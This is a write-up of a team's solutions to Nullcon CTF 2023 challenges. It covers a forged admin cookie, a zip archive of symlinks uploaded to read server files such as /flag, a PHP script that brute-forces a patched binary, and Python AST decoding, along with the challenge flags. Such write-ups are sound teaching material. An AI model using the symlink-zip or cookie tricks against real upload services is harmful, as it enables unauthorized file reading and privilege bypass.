# Nullcon CTF 2023

62nd place of 433, 498 points

## Challenges

### WEB

#### reguest

Manually set the following two cookies:

```
Cookie: role=admin;really=yes
```

ENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}

#### zpr

You can send a zipfile to a POST endpoint and it will unzip the contents for you and make them publically available. The solution is to sneak in a symlink.

```
$ ln -s ./flag         flag1
$ ln -s /tmp/data/flag flag2
$ ln -s /app/flag      flag3
$ ln -s /flag          flag4
$
$ zip payload.zip flag1 flag2 flag3 flag4 --symlinks
```

The flag `--symlinks` is required for symlinks to not be ignored while deflating.

Upload the zipfile and click on the link for flag4. It will download a file with the flag contents.

ENO{Z1pF1L3s_C4N_B3_Dangerous_so_b3_c4r3ful!}

### REV

#### wheel

TL;DR: We patched the binary to SEGFAULT when a correct character passes the continuation check. Then we brute forced ever single character. We also patched the binary after each successful character brute force to load the comparison data at an offset of iteration*4.

We get a binary that justs prints "Definitely not." when you execute it.

```bash
$ ./wheel
Definitely not.
```

Time to investigate. We found `main` at 0x1140 by debugging and stepping over the `__libc_start_main` call at 0x132b.

In `main` we found some checks. It checks that you provide exactly 2 arguments to the executable. Otherwise it just outputs "Definitely not."

```asm
0x0000114e  mov     dword [var_1ch], edi
0x00001152  cmp     edi, 2               
0x00001155  jne     0x12e8
```

We call the executable with the following argument:

```bash
$ ./wheel ABC
Nah.
```

After that there is a `strlen` call with an expected length of 27. So our input has to be of length 27. Otherwise it just outputs "Nah."

```asm
0x0000115b  mov     r13, qword [rsi + 8]
0x0000115f  mov     rdi, r13
0x00001162  call    strlen
0x00001167  cmp     rax, 0x1b  ; 27 decimal
0x0000116b  jne     0x12c1
```

We call the executable with the following argument:

```bash
$ ./wheel 11111111222222223333333
Nope.
```

Now it prints "Nope." instead of "Nah.". Progress!

At 0x1291 you can find a comparision that is called 27 times. If one comparison fails it prints "Nope.". Otherwise it continues to compare where `rax` points to with an offset increase of 4.

```asm
0x00001283  nop
0x00001284  nop
0x00001285  nop
0x00001286  nop
0x00001287  nop
0x00001288  add     rax, 4
0x0000128c  cmp     rax, rdx
0x0000128f  je      0x12d4
0x00001291  ucomiss xmm0, dword [rax]
0x00001294  jp      0x1298
0x00001296  je      0x1283
0x00001298  lea     rdi, str.Nope
0x0000129f  call    puts     
```

At 0x40a4 you can find 27 4-byte values. The program compares these values with the modified user input values. We don't know how the program modifies our user input, but at least we know what data is expected at compare time.


At 0x1271 you'll find the `lea` instruction to load the start of the compare data into `rax`.

```asm
0x00001271  lea     rax, [0x000040a4]
```

Well, we decided to patch the binary to SEGFAULT when a correct character appears. We can do that by patching the jump instruction right after the comparison to jump into nirvana. We then wrote a PHP script to patch the address of the data address to be at (0x40a4 - iteration*4).

```asm
0x00001283  nop
0x00001284  nop
0x00001285  nop
0x00001286  nop
0x00001287  nop
0x00001288  add     rax, 4
0x0000128c  cmp     rax, rdx
0x0000128f  je      0x12d4
0x00001291  ucomiss xmm0, dword [rax]
0x00001294  jp      0x1298             ; <- patched "jp" to "je"
                                       ;    patched 0x1298 to 0x9999
                                       ;    also jumps into forbidden
                                       ;    memory section -> SEGFAULT
0x00001296  je      0x1283
0x00001298  lea     rdi, str.Nope
0x0000129f  call    puts     
```

```php
<?php

function patchBinary($offset) {
    $contents = file_get_contents('wheel');
    $contents[0x1274 + 0] = pack('C', 0x28 + ($offset * 4));
    $contents[0x1274 + 1] = pack('C', 0x2e);
    file_put_contents('wheel_patched', $contents);
}

function force($offset, $string) {
    patchBinary($offset);

    $output = array();
    exec('./wheel_patched ' . $string . '', $output);

    // Output  > 0 means it executed normally
    // Output == 0 means it SEGFAULTed
    if (count($output) === 0) {
       return true; 
    }

    return false;
}

$language = 'abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}[]!.';
$result = '111111111111111111111111111';

for ($i = 0; $i < strlen($result); $i++) {
    for ($j = 0; $j < strlen($language); $j++) {
        $result[$i] = $language[$j];
        if (force($i, $result)) {
            echo $result . PHP_EOL;
            break;
        }
    }
}
```

Outputs:
```
E11111111111111111111111111
EN1111111111111111111111111
ENO111111111111111111111111
ENO{11111111111111111111111
ENO{f1111111111111111111111
ENO{fl111111111111111111111
ENO{fl011111111111111111111
ENO{fl0a1111111111111111111
ENO{fl0a7111111111111111111
ENO{fl0a7s11111111111111111
ENO{fl0a7s_1111111111111111
ENO{fl0a7s_c111111111111111
ENO{fl0a7s_c411111111111111
ENO{fl0a7s_c4n1111111111111
ENO{fl0a7s_c4n_111111111111
ENO{fl0a7s_c4n_b11111111111
ENO{fl0a7s_c4n_b31111111111
ENO{fl0a7s_c4n_b3_111111111
ENO{fl0a7s_c4n_b3_111111111
ENO{fl0a7s_c4n_b3_1n1111111
ENO{fl0a7s_c4n_b3_1nt111111
ENO{fl0a7s_c4n_b3_1nts11111
ENO{fl0a7s_c4n_b3_1nts_1111
ENO{fl0a7s_c4n_b3_1nts_t111
ENO{fl0a7s_c4n_b3_1nts_t011
ENO{fl0a7s_c4n_b3_1nts_t0o1
ENO{fl0a7s_c4n_b3_1nts_t0o}
```

ENO{fl0a7s_c4n_b3_1nts_t0o}

#### Pythopia

Just read the ast. You can find all the strings and operations in there.

```
key1: ENO{L13333333333 (each letter checked in separate if-clause)
key2: 7_super_duper_ok (from decimal, xor with 19)
key3: _!ftcnocllunlol_ (string)
key4: you_solved_it!!} (string)

```

ENO{L133333333337_super_duper_ok_!ftcnocllunlol_you_solved_it!!}
